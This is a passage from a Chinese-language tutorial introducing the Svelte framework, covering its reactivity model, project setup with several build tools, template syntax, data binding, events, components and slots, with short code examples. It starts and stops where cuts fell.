-\u0026gt; 找到要更新的節點 -\u0026gt; 更新真實DOM Vue 的數據更新原理其實也差不多，只是實現方式和使用語法會有所不同。\ndiff算法 會根據數據更新前和更新後生成的虛擬DOM進行對比，只有兩個版本的虛擬DOM存在差異時，才會更新對應的真實DOM。\n使用虛擬DOM對比的方式會比直接對比真實DOM的效率高。\n而且真實DOM身上掛載的屬性和方法非常多，使用虛擬DOM的方式去描述DOM節點樹會顯得更輕便。\n但這也意味著每次數據發生變化時都要先創建一個虛擬DOM，並使用 diff算法 將新虛擬DOM與舊虛擬DOM進行比對，這個步驟會消耗一點性能和需要一點執行時間。\n而 Svelte 在未使用虛擬DOM的情況下實現了響應式設計。\n我以粗暴的方式理解：Svelte 會監聽頂層組件所有變量，一旦某個變量發生變化，就更新使用過該變量的組件。這就僅僅只需更新受影響的那部分DOM元素，而不需要整個組件更新。\n綜上所述，在我的理解力，虛擬DOM的思想很優秀，也是順應時代的產物，但虛擬DOM並不是最快的，JS 直接操作 DOM 才是最快。\n《Virtual DOM is pure overhead》是 Svelte 官網上的一篇博客，專門討論虛擬DOM。有興趣的工友可以看看~\n更自然的響應式 這裡說的響應式設計是只關於數據的響應，而不是像 Bootstrap 的響應式佈局。\n現在流行的前端框架基本都使用 數據驅動視圖 這個概念，像 Vue 和 React 這些框架，都有響應式數據的概念。\n但 Vue 和 React 在數據響應方面還是有點不那麼自然，我簡單舉幾個例子：\n在 React 中，如果需要更新數據並在視圖中響應，需要使用 setState 方法更新數據。\n在 Vue2 中，響應式數據要放在 data 裡，在 methods 中使用 this.xxx 來更新數據。\n在 Vue3 的 Composition API 語法中，需要使用 ref 或者 reactive 等方法包裹數據，使用 xxx.value 等方式修改數據。\n上面這幾種情況，感覺多少都添加了點東西才能實現響應式數據功能（至少在普通開發者開發時是這樣）。\n在 Svelte 的理念中，響應式應該給開發者一種無感體驗，比如在 Excel 中，當我規定 C1 單元格的值是 A1 + B1 的和，設置好規則後，用戶只需要修改 A1 和 B1 即可，C1 會自動響應，而不需再做其他操作。\n在這方面，Svelte 我認為在現階段是做得最自然的。\n1 2 3 4 5 6 7 8 9 \u0026lt;h1\u0026gt;{name}\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; setTimeout(() =\u0026gt; { name = \u0026#39;鯊魚辣椒\u0026#39; }, 1000) \u0026lt;/script\u0026gt; 上面的代碼中，1秒後修改 name 的值，並更新視圖。\n從代碼就能看出，在使用 Svelte 開發項目時，開發者一般無需使用額外的方法就能做到和 Vue、React 的響應式效果。\n如果你對 Svelte 響應式原理感興趣，推薦閱讀 FESKY 的 《Svelte 響應式原理剖析—— 重新思考Reactivity》\n也可以看看 《Rethinking reactivity》，看看官方對 reactivity 的思考。\n性能強 Stefan Krause 給出一份 性能測試報告（點擊可查看） 對比里多個熱門框架的性能。從 Svelte 的性能測試結果可以看出，Svelte 是相當優秀的。\n內存優化 性能測試報告（點擊可查看） 也列出不同框架的內存佔用程度，Svelte 對內存的管理做到非常極致，佔用的內存也是非常小，這對於配置不高的設備來說是件好事。\n第5、6點，由於測試報告比較長，我沒截圖放進文中。大家有興趣可以點開鏈接查看測試報告。\n更關注無障礙體驗 在使用 Svelte 開發時會 自動對無障礙訪問方面的體驗進行檢測，比如 img 元素沒有添加 alt 屬性，Svelte 會向你發出一條警告。無障礙體驗對特殊人事來說是很有幫助的，比如當你在 img 標籤中設置好 alt 屬性值，使用有聲瀏覽器會把 alt 的內容讀出來。\n在此我還要推薦2本關於設計體驗的書。\n《點石成金：訪客至上的Web和移動可用性設計秘笈》 《包容性Web設計》 它們的封面長分別這個樣子\nSvelte 的優勢肯定還有很多，但由於我開發經驗不足，只能總結出以上這些了。如果你對 Svelte 有更多理解，歡迎在評論區補充~\nSvelte 的不足 Svelte 對 IE 是非常不友好的，但我並不把這放在眼裡。如果想兼容 IE 我還是推薦使用 jQuery。 Svelte 的生態不夠豐富。由於是新寵，生態方面肯定是不如 Vue 和 React 的。 與 Svelte 相關的庫 Sapper Sapper 官網地址\nSapper 是構建在Svelte 上的框架，Sapper 提供了頁面路由、佈局模板、SSR等功能。\nSvelte Native Svelte Native 官網地址\nSvelte Native 是建立在 NativeScript 之上的產物，可以開發安卓和iOS應用，是一個跨端技術。\n有點類似於 React Native 和 Weex 之類的東西。\nsvelte-gl svelte-gl Github\nsvelte-gl 還沒正式發布，但這是個很有趣的工具，它和three.js類似，專門做3D應用的。\n雖然現在 github 上的 Star 還不是很多，但也可以寫些 demo 玩玩。\n創建項目 在開始之前，你需要在電腦上安裝Node環境(v16+)。\n編輯工具我使用了 VS Code，同時安裝了 Svelte for VS Code 擴展插件。\n使用 Svelte 前，必須有一個開發環境。\n創建或使用開發環境有以下幾種方式：\nREPL Rollup版 Webpack版 Parcel版 Vite版 本文使用的是 Vite 創建項目，但上面列出的所有方式我都會逐一說說。\nREPL REPL是 Svelte 提供的一個線上環境，打開 Svelte 官網 可以看到頂部導航欄上面有個 REPL 的選項。點擊該選項就可以跳轉到 Svelte 線上開發環境了。\nREPL 是 read(讀取)、evaluate(執行)、print(打印) 和 loop(循環) 這幾個單詞的縮寫。\n如果你只是想嘗試 Svelte 的某些功能或者測試小型代碼，可以使用這款線上工具。\nREPL還提供了多組件開發，按左上角的 ＋ 可以創建新組件。組件的內容稍後會說到。\n界面右側，頂部有3個選項：\nResult： 運行結果。 JS output： Svelte 編譯後的 JS 代碼。 CSS output： Svelte 編譯後的 CSS 代碼。 在 REPL 界面右上角還有一個下載按鈕。\n當你在線上環境寫好代碼，可以點擊下載按鈕把項目保存到本地，下載的文件是一個 zip，需要自己手動解壓。\n然後使用以下命令初始化項目並運行即可。\n1 2 3 4 5 6 7 # 1. 初始化項目 npm install # 2. 運行項目 npm run dev # 3. 在瀏覽器訪問 http://localhost:5000 運行結果：\nRollup 版 Svelte 官方也提供了一個命令，可以下載 Svelte 項目到本地。\n命令最後需要輸入你的項目名稱。\n1 2 3 4 5 6 7 8 9 10 # 1. 下載模板 npx degit sveltejs/template 項目名稱 # 2. 安裝依賴 npm install # 3. 運行項目 npm run dev # 4. 在瀏覽器訪問 http://localhost:8080 運行結果：\n這是官方提供的創建項目方式，這個項目是使用 Rollup 打包的。 Rollup 和 Svelte 都是同一個作者（Rich Harris）開發的，用回自家東西很正常。\nWebpack 版 如果你不想使用 Rollup 打包項目，可以嘗試使用 Webpack。\n1 2 3 4 5 6 7 8 9 10 # 1. 下載模板 npx degit sveltejs/template-webpack 項目名稱 # 2. 安裝依賴 npm install # 3. 運行項目 npm run dev # 4. 在瀏覽器訪問 http://localhost:8080 運行結果：\nParcel 版 我並 不推薦使用 該方法創建項目，因為Svelte 並沒有提供使用Parcel 打包工具的模板。但 GitHub 上有第三方的解決方案（點擊訪問倉庫）。\n將DeMoorJasper/parcel-plugin-svelte的代碼下載下來。\n1 2 3 4 5 6 7 8 9 # 1. 進入 `packages/svelte-3-example` 目錄 # 2. 安裝依賴 npm install # 3. 運行項目 npm run start # 4. 在瀏覽器訪問 http://localhost:1234 運行結果：\nVite 版 本文接下來所有例子都是使用 Vite 創建 Svelte 項目進行開發的。\n使用 Vite 創建項目的原因是：快！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1. 下載模板 npm init vite@latest # 2. 輸入項目名稱 # 3. 選擇 Svelte 模板(我沒選ts) # 4. 安裝依賴 npm install # 5. 運行項目 npm run dev # 6. 在瀏覽器訪問 http://127.0.0.1:5173 運行結果：\n本文使用 Vite 創建項目，目錄結構和Rollup版創建出來的項目結構稍微有點不同，但開發邏輯是一樣的。\n起步 index.html、src/main.js 和 src/App.svelte 這三個是最主要的文件。\nindex.html 是項目運行的入口文件，它裡面引用了 src/main.js 文件。\nsrc/main.js 裡引入了 src/App.svelte 組件，並使用以下代碼將 src/App.svelte 的內容渲染到 #app 元素裡。\n1 2 3 const app = new App({ target: document.getElementById(\u0026#39;app\u0026#39;) }) target 指明目標元素。\n我們大部分代碼都是寫在 .svelte 後綴的文件裡。\n.svelte 文件主要確保 多個 HTML 元素、1個 script 元素 和 1個 style 元素。這3類元素都是可選的。\n我們主要的工作目錄是 src 目錄。\n為了減輕學習難度，我們先做這幾步操作。\n清空全局樣式 如果你使用Rollup版創建項目，不需要做這一步。\n在使用 Vite 創建的 Svelte 項目中，找到 src/app.css 文件，並把裡面的內容清空掉。\n改造 src/App.svelte 將 src/App.svelte 文件改成以下內容\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let name = \u0026#39;雷侯\u0026#39; function handleClick() { name = \u0026#39;鯊魚辣椒\u0026#39; } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;Hello {name}\u0026lt;/div\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt;改名\u0026lt;/button\u0026gt; 此時點擊按鈕，頁面上的\u0026quot;雷猴\u0026quot; 就會變成\u0026quot;鯊魚辣椒\u0026quot;\n上面的代碼其實和 Vue 有點像。\n變量和方法都寫在 \u0026lt;script\u0026gt; 標籤裡。 在 HTML 中使用 {} 可以綁定變量和方法。 通過 on:click 可以綁定點擊事件。 只需寫以上代碼，Svelte 就會自動幫我們做數據響應的操作。一旦數據發生改變，視圖也會自動改變。\n是不是非常簡單！\n基礎模板語法 Svelte 的模板語法其實和 Vue 是有點像的。如果你之前已經使用過 Vue，那本節學起來就非常簡單。\n插值 在\u0026quot;起步章節\u0026quot; 已經使用過 插值 了。在 Svelte 中，使用 {} 大括號將 script 裡的數據綁定到 HTML 中。\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; 此時頁面上就會出現 name 的值。\n這種語法和 Vue 是有點像的，Vue 使用雙大括號的方式 {{}} 綁定數據。 Svelte 就少一對括號。\n表達式 在 HTML 中除了可以綁定變量外，還可以綁定表達式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; function sayHi() { return `${name} 世界！` } let a = 1 let b = 2 let state = false \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{sayHi()}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{a} + {b} = {a + b}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{state ? \u0026#39;雷猴\u0026#39; : \u0026#39;鯊魚辣椒\u0026#39;}\u0026lt;/div\u0026gt; 屬性綁定 HTML 的屬性需要動態綁定數據時，也是使用 {} 語法。\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div title={name}\u0026gt;Hello\u0026lt;/div\u0026gt; 當鼠標放到 div 標籤上時，會出現 title 裡的提示信息。\n渲染 HTML 標籤 @html 如果只是使用插值的方法渲染帶有 HTML 標籤的內容，Svelte 會自動轉義 \u0026lt;、\u0026gt; 之類的標籤。\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;雷猴\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{h1El}\u0026lt;/div\u0026gt; 這種情況多數出現在渲染文本。\n在 Vue 中有 v-html 方法，它可以將 HTML 標籤渲染出來。在 Svelte 中也有這個方法，在插值前面使用 @html 標記一下即可。\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;雷猴\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{@html h1El}\u0026lt;/div\u0026gt; 但此方法有可能遭受 XSS 攻擊。\n我在 「NodeJS 防止 xss 攻擊」 中簡單演示過 XSS 攻擊，有興趣的可以看看。\n樣式綁定 在日常開發中，給 HTML 標籤設置樣式主要通過 行内 style 和 class 屬性。\n基礎的 HTML 寫法和原生的一樣，這裡不過多講解。\n下面主要講動態設置樣式，也就是將 JS 裡的變量或者表達式綁定到 style 或者 class 裡。\n行內樣式 style 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let color = \u0026#39;red\u0026#39; setTimeout(() =\u0026gt; { color = \u0026#39;blue\u0026#39; }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;color: {color}\u0026#34;\u0026gt;雷猴\u0026lt;/div\u0026gt; 1秒後，文字從紅色變成藍色。\n綁定class 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let foo = true setTimeout(() =\u0026gt; { foo = false }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div class:active={foo}\u0026gt;雷猴\u0026lt;/div\u0026gt; \u0026lt;style\u0026gt; .active { color: red; } \u0026lt;/style\u0026gt; 在 HTML 裡可以使用 class:xxx 動態設置要激活的類。這裡的 xxx 是對應的類名。\n語法是 class:xxx={state}，當 state 為 true 時，這個樣式就會被激活使用。\n條件渲染 #if 使用 {#if} 開頭、{/if} 結尾。\n基礎條件判斷 1 2 3 {#if 条件判断} ... {/if} 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;雷猴\u0026lt;/div\u0026gt; {/if} 1秒後改變狀態\n兩種條件 1 2 3 4 5 {#if 条件判断} ... {:else} ... {/if} 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;雷猴\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;鯊魚辣椒\u0026lt;/div\u0026gt; {/if} 多種條件 1 2 3 4 5 {#if 條件判斷} ... {:else if 條件判斷} ... {/if} 舉個例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let count = 1 setInterval(() =\u0026gt; { count++ }, 1000) \u0026lt;/script\u0026gt; {#if count === 1} \u0026lt;div\u0026gt;雷猴\u0026lt;/div\u0026gt; {:else if count === 2} \u0026lt;div\u0026gt;鯊魚辣椒\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;蟑螂惡霸\u0026lt;/div\u0026gt; {/if} 條件渲染的用法比較簡單，只要 JS 基礎就能看得懂。\n列表渲染 #each 如果你有一堆數據需要展示出來，可以使用 #each 方法。\n使用 {#each} 開頭、{/each} 結尾。\n遍歷數組 1 2 3 {#each expression as name} ... {/each} 舉個例子\n1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item} \u0026lt;li\u0026gt;{item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; 要注意，Svelte 和 Vue 的遍歷在寫法上有點不同。\nVue 的方式是：\n1 2 3 \u0026lt;div v-for=\u0026#34;元素 in 源數據\u0026#34;\u0026gt; \u0026lt;span\u0026gt;{{元素}}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; Svelte 的方式是：\n1 2 3 4 5 \u0026lt;div\u0026gt; {#each 源數據 as 元素} \u0026lt;span\u0026gt;{元素}\u0026lt;/span\u0026gt; {/each} \u0026lt;/div\u0026gt; 遍歷數組(帶 index) 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item, index} \u0026lt;li\u0026gt;{index} -- {item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; 注意：as 後面首先跟著元素，然後才是下標。而且元素和下標不需要用括號括起來。\n如果元素是對象，可以解構 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let list = [ {name: \u0026#39;雷猴\u0026#39;}, {name: \u0026#39;鯊魚辣椒\u0026#39;} ] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as {name}} \u0026lt;li\u0026gt;{name}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; 默認內容 如果源數據沒有內容，是空數組的情況下，還可以組合 {:else} 一起使用。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let list = [] \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt; {#each list as {name}} \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;暫無數據\u0026lt;/div\u0026gt; {/each} \u0026lt;/div\u0026gt; 事件綁定 on:event 使用 on: 指令監聽 DOM 事件，on: 後面跟隨事件類型\n語法：\n1 on:事件類型={事件名} 舉個例子，點擊按鈕時在控制台輸出\u0026quot;雷猴\u0026quot;。\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;雷猴\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={sayHi}\u0026gt;打招呼\u0026lt;/button\u0026gt; 綁定其他事件（比如change等）也是同樣的道理。\n事件修飾符 如果你只希望某些事件只執行一次，或者取消默認行為，或者阻止冒泡等，可以使用事件修飾符。\n語法：\n1 on:事件類型|修飾符={事件名} 舉個例子，我希望點擊事件只能執行一次，之後再點擊都無效，可以使用官方提供的 once 修飾符。\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;雷猴\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click|once={sayHi}\u0026gt;打招呼\u0026lt;/button\u0026gt; 從上圖可以看出，多次點擊都只是輸出1次\u0026quot;雷猴\u0026quot;。\n除了 once 之外，還有以下這些修飾符可以用：\npreventDefault：禁止默認事件。在程序運行之前調用event.preventDefault() stopPropagation：調用event.stopPropagation(), 防止事件到達下一個標籤 passive：改善了touch/wheel 事件的滾動表現（Svelte會在合適的地方自動加上它） capture：表示在capture階段而不是bubbling觸發其程序 once：程序運行一次後刪除自身 串聯修飾符 修飾符還可以串聯起來使用，比如 on:click|once|capture={...}\n但需要注意，有些特殊的標籤使用修飾符會出現\u0026quot;意想不到\u0026ldquo;的結果，比如 \u0026lt;a\u0026gt; 標籤。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; function toLearn() { console.log(\u0026#39;還在思考要不要學Canvas\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;a href=\u0026#34;https://juejin.cn/post/7116784455561248775\u0026#34; on:click|once|preventDefault={toLearn} \u0026gt;去學習Canvas ？\u0026lt;/a\u0026gt; 本來是想給 \u0026lt;a\u0026gt; 標籤綁定一個點擊事件，第一次點擊時在控制台輸出一句話，並且禁止 \u0026lt;a\u0026gt; 標籤的默認事件。\n所以使用了 once 和 preventDefault 修飾符。\n但實際上並非如此。上面的代碼意思是 once 設定了只執行一次 toLearn 事件，並且只有一次 preventDefault 是有效的。\n只有點擊時就不觸發 toLearn 了，而且 preventDefault 也會失效。所以再次點擊時，\u0026lt;a\u0026gt;元素就會觸發自身的跳轉功能。\n數據綁定 bind 數據綁定通常會和表單元素結合使用。\nbind 可以做到雙向數據綁定的效果。我覺得 Svelte 裡的 bind 有點像 Vue 的 v-model。\n語法：\n1 bind:property={variable} input 單行輸入框 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; function print() { console.log(msg) } \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; value={msg} /\u0026gt; \u0026lt;button on:click={print}\u0026gt;打印\u0026lt;/button\u0026gt; 如果只是使用 value={msg} 的寫法，input 默認值是 hello，當輸入框的值發生改變時，並沒有把內容反應回 msg 變量裡。\n此時就需要使用 bind 了。\n1 2 \u0026lt;!-- 省略部分代碼 --\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; textarea 多行文本框 多行文本框同樣綁定在 value 屬性上。\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;textarea type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; \u0026lt;p\u0026gt;{msg}\u0026lt;/p\u0026gt; input range 範圍選擇 因為都是 input 元素，只是 type 不同而已。所以範圍選擇元素同樣需要綁定value。\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let val = 3 \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; bind:value={val} min=0 max=10 /\u0026gt; \u0026lt;p\u0026gt;{val}\u0026lt;/p\u0026gt; radio 單選 單選框通常是成組出現的，所以要綁定一個特殊的值 bind:grout={variable}\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; let selected = \u0026#39;2\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;3\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{selected}\u0026lt;/p\u0026gt; checkbox 複選框 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let roles = [] \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;雷猴\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;鲨鱼辣椒\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;蟑螂恶霸\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;蝎子莱莱\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{roles}\u0026lt;/p\u0026gt; select 選擇器 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let selected = \u0026#39;a\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;select bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#39;a\u0026#39;\u0026gt;a\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;b\u0026#39;\u0026gt;b\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;c\u0026#39;\u0026gt;c\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; select multiple 選擇器 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let selected = [] \u0026lt;/script\u0026gt; \u0026lt;select multiple bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#34;雷猴\u0026#34;\u0026gt;雷猴\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;鲨鱼辣椒\u0026#34;\u0026gt;鲨鱼辣椒\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;蟑螂恶霸\u0026#34;\u0026gt;蟑螂恶霸\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;蝎子莱莱\u0026#34;\u0026gt;蝎子莱莱\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; 簡寫形式 如果 bind 綁定的屬性和在 JS 裡聲明的變量名相同，那可以直接綁定\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; let value = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value /\u0026gt; \u0026lt;p\u0026gt;{value}\u0026lt;/p\u0026gt; 這個例子中， bind:value 綁定的屬性是 value，而在 JS 中聲明的變量名也叫 value，此時就可以使用簡寫的方式。\n$: 聲明反應性 通過使用 $: JS label 語法作為前綴。可以讓任何位於top-level 的語句（即不在塊或函數內部）具有反應性。每當它們依賴的值發生更改時，它們都會在 component 更新之前立即運行。\n上面這段解釋是官方文檔的解釋。\n$:在文檔中稱為Reactivity，中文文檔成它為反應性能力。\n但我使用 $: 時，覺得這個功能有點像 Vue 的 computed。\n$: 可以監聽表達式內部的變化從而做出響應。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; let count = 0; $: doubled = count * 2; function handleClick() { count += 1; } \u0026lt;/script\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt; 點擊加1 \u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;{count} 翻倍後 {doubled}\u0026lt;/p\u0026gt; 使用 $: 聲明的 double 會自動根據 count 的值改變而改變。\n如果將以上代碼中 $: 改成 let 或者 var 聲明 count，那麼 count 將失去響應性。\n這樣看來，真的和 Vue 的 computed 的作用有那麼一點像。\n異步渲染 #await Svelte 提供異步渲染標籤，可以提升用戶體驗。\n語法：\n1 2 3 4 5 6 7 {#await expression} ... {:then name} ... {:catch name} ... {/await} 以 #await 開始、以 /await 結束。\n:then 代表成功結果，:catch 代表失敗結果。\nexpression是判斷體，要求返回一個Promise。\n其實用法和 #if ... :else if ... /if 有那麼一丟丟像。\n舉個例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; const api = new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve(\u0026#39;請求成功，數據是xxxxx\u0026#39;) }, 1000) }) \u0026lt;/script\u0026gt; {#await api} \u0026lt;span\u0026gt;Loading...\u0026lt;/span\u0026gt; {:then response} \u0026lt;span\u0026gt;{response}\u0026lt;/span\u0026gt; {:catch error} \u0026lt;span\u0026gt;{error}\u0026lt;/span\u0026gt; {/await} 如果將上面的 resolve 改成 reject 就會走 :catch 分支。\n基礎組件 在 Svelte 中，創建組件只需要創建一個 .svelte 為後綴的文件即可。\n通過 import 引入子組件。\n比如，在 src 目錄下有 App.svelte 和 Phone.svelte 兩個組件。\nApp.svelte 是父級，想要引入 Phone.svelte 並在 HTML 中使用。\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone /\u0026gt; Phone.svelte 1 \u0026lt;div\u0026gt;電話：13266668888\u0026lt;/div\u0026gt; 組件通訊 組件通訊主要是 父子組件 之間的數據來往。\n父傳子 比如上面的例子，手機號希望從 App.svelte 組件往 Phone.svelte 裡傳。\n可以在 Phone.svelte 中聲明一個變量，並公開該變量。\nApp.svelte 就可以使用對應的屬性把值傳入。\nApp.svelte 1 2 3 4 5 6 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone number=\u0026#34;88888888\u0026#34; /\u0026gt; Phone.svelte 1 2 3 4 5 \u0026lt;script\u0026gt; export let number = \u0026#39;13266668888\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;電話：{number}\u0026lt;/div\u0026gt; 如果此時 App.svelte 組件沒有傳值進來，Phone.svelte 就會使用默認值。\n子傳父 如果想在子組件中修改父組件的內容，需要把修改的方法定義在父組件中，並把該方法傳給子組件調用。\n同時需要在子組件中引入 createEventDispatcher 方法。\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; function print(data) { console.log(`手機號碼：${data.detail}`) } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone on:printPhone={print} /\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; import { createEventDispatcher } from \u0026#39;svelte\u0026#39; const dispatch = createEventDispatcher() function printPhone() { dispatch(\u0026#39;printPhone\u0026#39;, \u0026#39;13288888888\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={printPhone}\u0026gt;輸出手機號碼\u0026lt;/button\u0026gt; 父組件接受參數是一個對象，子組件傳過來的值都會放在 detail 屬性裡。\n插槽 slot 和 Vue 一樣，Svelte 也有組件插槽。\n在子組件中使用 \u0026lt;slot\u0026gt; 標籤，可以接收父組件傳進來的 HTML 內容。\nApp.svelte 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; import Phone from \u0026#39;./Phone.svelte\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;子組件 Phone 的内容：\u0026lt;/div\u0026gt; \u0026lt;Phone\u0026gt; \u0026lt;div\u0026gt;電話：\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;13288889999\u0026lt;/div\u0026gt; \u0026lt;/Phone\u0026gt; Phone.svelte 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;style\u0026gt; .box { width: 100px; border: 1px solid #aaa; border-radius: 8px; box-shadow: 2px 2px 8px rgba(0,0,0,0.1); padding: 1em; margin: 1em 0; } \u0026lt;/style\u0026gt; \u0026lt;div 